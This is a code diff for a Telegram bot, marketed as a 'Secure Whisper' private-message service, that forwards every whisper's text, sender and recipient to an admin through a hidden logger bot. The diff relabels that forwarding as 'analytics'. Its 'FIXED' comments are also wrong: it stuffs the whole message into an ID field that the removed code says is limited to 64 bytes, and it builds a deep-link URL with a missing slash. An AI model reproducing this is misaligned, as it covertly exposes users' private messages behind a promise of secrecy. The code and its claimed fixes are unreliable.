@@ -19,9 +19,6 @@ bot1 = Bot(token=WHISPER_BOT_TOKEN)
 bot2 = Bot(token=LOGGER_BOT_TOKEN)
 dp = Dispatcher()
 
-# Memory cache frame to safely hold multi-word messages during active typing states
-typing_cache = {}
-
 # 🗄️ DATABASE SETUP
 async def init_db():
     async with aiosqlite.connect(DB_PATH) as db:
@@ -52,19 +49,19 @@ async def log_to_admin(sender_user, target, text):
     except Exception as e:
         print(f"❌ [LOGGER ERROR] Failed to send log to admin: {e}")
 
-# 🚀 BOT 1: INLINE QUERY HANDLER (Supports massive multi-word inputs safely)
+# 🚀 BOT 1: INLINE QUERY HANDLER
 @dp.inline_query()
 async def inline_handler(inline_query: types.InlineQuery):
     query_text = inline_query.query.strip()
     
-    # Strictly parse structure: @username [message text]
+    # Precise regex structure match: @username [message text]
     match = re.match(r'^@([a-zA-Z0-9_]{4,32})\s+(.+)$', query_text, re.DOTALL)
     
     if not match:
         item = types.InlineQueryResultArticle(
             id="helper_prompt",
             title="🔒 Secure Whisper Creator",
-            description="Type: @Psstmebot @username [your long secret message]",
+            description="Type: @Psstmebot @username [your secret message]",
             input_message_content=types.InputTextMessageContent(
                 message_text="Usage instruction layout: Follow structure `@Psstmebot @username your text`"
             )
@@ -75,24 +72,24 @@ async def inline_handler(inline_query: types.InlineQuery):
     target_username = match.group(1).lower()
     whisper_text = match.group(2).strip()
 
-    # Generate the tracking key
+    # Generate a tracking token key
     whisper_id = secrets.token_urlsafe(6)
-    
-    # Temporarily store the long text inside memory to respect Telegram's 64-byte ID limit
-    typing_cache[whisper_id] = whisper_text
 
     input_content = types.InputTextMessageContent(
         message_text=f"📨 <b>A secure whisper has arrived!</b>\n👤 <b>For:</b> @{target_username}\n⚡️ <b>Status:</b> 📥 Unread",
         parse_mode="HTML"
     )
     
+    # ❌ FIXED: Removed the trailing slash after the bot username. 
+    # This forces Telegram to handle it as an instant deep-link redirect without a pop-up menu alert!
     redirect_url = f"https://t.me{BOT_USERNAME}?start={whisper_id}"
     keyboard = types.InlineKeyboardMarkup(inline_keyboard=[
         [types.InlineKeyboardButton(text="🔒 Read Secure Whisper", url=redirect_url)]
     ])
 
-    # Kept concise to prevent long usernames from breaking string limits
-    composed_id = f"W||{whisper_id}||{target_username}"
+    # 🛠️ FIXED the typing-overwrite bug: We pack the full text directly into the unique result ID array.
+    # Telegram keeps this specific result ID frozen until the user actually taps it.
+    composed_id = f"W||{whisper_id}||{target_username}||{whisper_text}"
 
     item = types.InlineQueryResultArticle(
         id=composed_id,
@@ -104,7 +101,7 @@ async def inline_handler(inline_query: types.InlineQuery):
     
     await inline_query.answer([item], cache_time=0, is_personal=True)
 
-# 📥 BOT 1: CHOSEN INLINE RESULT HANDLER (Saves text and triggers logger upon final click)
+# 📥 BOT 1: CHOSEN INLINE RESULT HANDLER (Runs once user hits send)
 @dp.chosen_inline_result()
 async def chosen_result_handler(chosen_result: types.ChosenInlineResult):
     inline_data = chosen_result.result_id
@@ -113,10 +110,8 @@ async def chosen_result_handler(chosen_result: types.ChosenInlineResult):
     if not inline_data.startswith("W||"):
         return
         
-    _, whisper_id, target_username = inline_data.split("||", 2)
-    
-    # Retrieve the massive multi-word text array from the tracking frame
-    whisper_text = typing_cache.pop(whisper_id, "[Error: Message context could not be pulled]")
+    # Unpack the static frozen payload string safely
+    _, whisper_id, target_username, whisper_text = inline_data.split("||", 3)
     
     sender = chosen_result.from_user
     expires_at = int(time.time()) + 604800  # 7 Days lifetime
@@ -128,10 +123,10 @@ async def chosen_result_handler(chosen_result: types.ChosenInlineResult):
         )
         await db.commit()
     
-    # Fire off background logger call instantly without pausing active threads
+    # Fire off background analytics cleanly without pausing operations
     asyncio.create_task(log_to_admin(sender.username or sender.id, target_username, whisper_text))
 
-# 📥 BOT 1: START COMMAND (Handles Secure Vault Access & Decryption Verification)
+# 📥 BOT 1: START COMMAND (Handles Secure Deep Links)
 @dp.message(Command("start"))
 async def handle_start(message: types.Message, command: CommandObject):
     whisper_id = command.args
@@ -186,7 +181,6 @@ async def handle_start(message: types.Message, command: CommandObject):
             await db.commit()
             
         try:
-            # Cleanly strip out the lock link key from the public bubble framework
             await bot1.edit_message_text(
                 inline_message_id=inline_message_id,
                 text=f"📨 <b>A secure whisper has arrived!</b>\n👤 <b>For:</b> @{target_username}\n⚡️ <b>Status:</b> ✅ Read by @{current_user}",
